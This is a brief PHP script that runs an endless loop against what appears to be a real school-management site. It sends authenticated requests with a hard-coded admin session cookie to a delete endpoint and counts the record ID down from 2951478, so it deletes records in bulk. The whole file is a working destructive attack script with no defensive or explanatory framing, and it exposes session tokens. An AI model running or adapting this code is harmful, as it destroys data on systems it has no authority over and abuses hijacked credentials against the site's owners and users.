<?php
set_time_limit(0);
$start = 2951478;

$url = "https://smartcookie.in/core/delete_teacher_subject_master.php?id=";
$cookie = 'PHPSESSID=om6tsrgif9sueng10ge3cqjgf2;&ci_session=00eed6858f3a94d64f8b7f427604e6ed7221e1a1&usertype=School+Admin';
$headers[] = 'Cookie: ' . $cookie;

while (True) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url . $start);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);
    echo htmlspecialchars($res);
    $start--;
}
